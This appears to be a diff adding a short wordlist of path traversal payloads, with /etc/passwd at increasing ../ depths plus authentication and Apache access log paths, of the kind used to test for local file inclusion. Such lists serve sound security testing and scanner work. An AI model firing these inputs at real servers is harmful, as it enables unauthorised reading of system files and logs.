@@ -1,0 +1,10 @@
+/etc/passwd
+../etc/passwd
+../../etc/passwd
+../../../etc/passwd
+../../../../etc/passwd
+../../../../../etc/passwd
+/var/log/auth.log
+/var/log/apache2/auth.log
+/var/log/apache2/access.log
+../../../../../var/log/apache2/access.log
